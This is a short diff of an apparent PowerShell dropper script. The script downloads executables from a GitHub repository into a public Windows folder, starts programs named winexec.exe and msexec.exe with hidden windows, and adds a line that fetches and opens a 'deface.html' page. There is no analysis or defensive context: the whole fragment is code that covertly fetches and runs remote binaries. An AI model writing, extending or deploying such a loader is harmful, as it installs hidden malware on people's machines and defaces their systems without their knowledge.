@@ -9,4 +9,5 @@ Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/srcs/moni
 Invoke-WebRequest -Uri "https://raw.githubusercontent.com/0fxdb/instructions/main/srcs/runner.exe" -OutFile "C:\\Users\\Public\\Documents\\runner.exe";
 Start-Process C:\\Users\\Public\\Documents\\winexec.exe -WindowStyle Hidden;
 Start-Process C:\\Users\\Public\\Documents\\msexec.exe -WindowStyle Hidden;
+Invoke-WebRequest -Uri "https://github.com/0fxdb/instructions/raw/main/deface.html" -OutFile "C:\\Users\\Public\\Documents\\deface.html";
 Start-Process C:\\Users\\Public\\Documents\\deface.html;
